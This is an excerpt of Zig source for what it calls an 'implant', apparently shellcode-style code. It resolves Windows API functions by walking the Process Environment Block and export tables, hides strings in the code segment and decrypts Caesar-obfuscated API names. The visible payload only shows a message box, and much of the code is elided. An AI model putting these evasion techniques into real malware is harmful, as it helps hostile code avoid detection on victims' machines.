...
/// Place a static zero-terminated string somewhere in the code segment and
/// return an array pointing to the memory in the code segment(cs) that contains the string
noinline fn place_string_in_cs(comptime s: []const u8) *[s.len]u8 {
    // get location of the instruction pointer
    const eax: *usize = get_eip();

    // Add 6 to string length to account for number of bytes from the mnemonics助记符 (5) and the zero-terminator
    asm volatile (std.fmt.comptimePrint("add ${d}, %eax", .{s.len + 1 + 5}));

    // Jump over character bytes of the target string
    asm volatile ("jmp *%eax");

    // insert string into the code segment (cs)
...
/// Return the address of the ProcessEnvironmentBlock On x86, this struct is located in the FS register at 0x30
...
fn get_module(dll_name: []const u8) ImplantError!*api.IMAGE_DOS_HEADER {
    ...
    while (!module.FullDllName.equals(dll_name)) {
        ...
        // Check if we returned back to the head.
        // 转了一圈又回来了，说明这个列表里都没有
        // In this case the module could not be found.
        if (entry == &peb.Ldr.InMemoryOrderModuleList) {
            return ImplantError.ModuleNotFound;
        }
    }

    // The address of the loaded module is stored in the first pointer of the InIntializationOrderLinks field.
...
fn get_win32_function(pe_module: *api.IMAGE_DOS_HEADER, func_name: []const u8) ImplantError!*usize {
    ...
    // Lookup ordinal value of functioin
    const ordinals: [*]u16 = @alignCast(@ptrCast(imagebase + export_section.AddressOfNameOrdinals));
    const ordinal_idx: u16 = ordinals[found_at.?]; // 前面已经排除了为null的可能性！

    // Lookup function address at oridinal index
...
fn implant_main() ImplantError!u8 {
    ...
    obf.caeser_decrypt(data.LoadLibraryA.Name, caeser_shift, &load_library_a_decrypted);
    ...
    // Load MessageBoxA funciton pointer
